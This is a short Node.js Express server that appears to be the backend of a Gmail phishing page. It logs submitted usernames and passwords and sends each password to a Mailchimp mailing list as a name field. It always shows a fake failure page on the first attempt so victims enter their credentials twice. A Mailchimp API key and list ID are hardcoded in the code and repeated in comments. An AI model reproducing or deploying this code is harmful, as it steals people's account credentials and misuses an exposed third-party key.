const express = require("express");
const bodyParser = require("body-parser");
const request = require("request");
const http = require("https");

const app = express();

app.use(express.static("public"));
app.use(bodyParser.urlencoded({extended: true}));

var number = 1;

app.get("/", function(req, res) {
    res.sendFile(__dirname + "/home.html")
});

app.post("/", function(req, res) {

    var username = req.body.user;
    var password = req.body.pass;

    console.log("username: " + username);
    console.log("password: " + password);
    console.log();
    
    username = username + "@gmail.com";

    var data = {
        members : [
            {
                email_address: username,
                update_existing: true,
                status: "subscribed",
                merge_fields : {
                    FNAME: password
                }
            }
        ]
    }

    const jsonData = JSON.stringify(data);

    const url = "https://us2.api.mailchimp.com/3.0/lists/d461074d1d";

    const options = {
        method: "POST",
        auth: "chianx1:144fbe97fb11e21d874db692d085c7c5-us2"
    }

    const request = http.request(url, options, function(response) {
        response.on("data", function(data) {
            console.log(JSON.parse(data));
        });
    });

    request.write(jsonData);
    request.end();


    if (number ==1 && res.statusCode == 200) {
        res.sendFile(__dirname + "/failure.html");
        number ++;
    }else {
        res.sendFile(__dirname + "/success.html");
        number =1;
    }


    
});

app.post("/failure.html", function(req, res) {
    res.redirect("/");
});

app.listen(process.env.PORT ||3000, function() {
    console.log("Server is running on port 3000");
});

// api key
// 144fbe97fb11e21d874db692d085c7c5-us2

 
// list id
// d461074d1d